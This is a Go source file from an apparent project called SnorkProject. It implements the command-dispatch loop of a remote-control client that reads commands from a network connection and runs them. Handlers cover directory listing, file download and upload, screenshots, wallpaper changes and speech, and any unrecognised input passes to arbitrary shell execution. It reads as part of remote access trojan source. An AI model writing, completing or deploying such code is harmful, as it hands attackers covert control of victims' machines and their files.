package client

import (
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/nb-322/SnorkProject/internal/protocol"
)

type Command struct {
	Name string
	Args string
}
type Handler func(s *Session, args string) error
type Executor struct {
	handlers map[string]Handler
}

func NewExecutor() *Executor {
	e := &Executor{
		handlers: make(map[string]Handler),
	}

	e.register()
	return e
}

func (e *Executor) register() {
	e.handlers["info"] = handleInfo
	e.handlers["cd"] = handleCD
	e.handlers["ls"] = handleLS
	e.handlers["download"] = handleDownload
	e.handlers["upload"] = handleUpload
	e.handlers["screenshot"] = handleScreenShot
	e.handlers["wallpaper"] = handleWallpaper
	e.handlers["speak"] = handleSpeech
}
func (e *Executor) Execute(s *Session, cmd Command) error {
	handler, ok := e.handlers[cmd.Name]
	if !ok {
		fullCmd := cmd.Name
		if cmd.Args != "" {
			fullCmd += " " + cmd.Args
		}
		return handleExec(s, fullCmd)
	}
	return handler(s, cmd.Args)
}
func parse(raw string) Command {
	parts := strings.SplitN(raw, " ", 2)
	if len(parts) == 1 {
		return Command{Name: parts[0]}
	}
	return Command{Name: parts[0], Args: parts[1]}
}
func (exec *Executor) RunShell(conn net.Conn) {
	currPath, _ := os.Getwd()
	session := &Session{
		Conn:        conn,
		CurrentPath: currPath,
	}
	for {
		msg, err := protocol.ReliableReceive(conn)
		if err != nil {
			return
		}
		cmd := parse(msg.Command)

		err = exec.Execute(session, cmd)
		if err != nil {
			fmt.Println("exec error:", err)
		}
	}
}
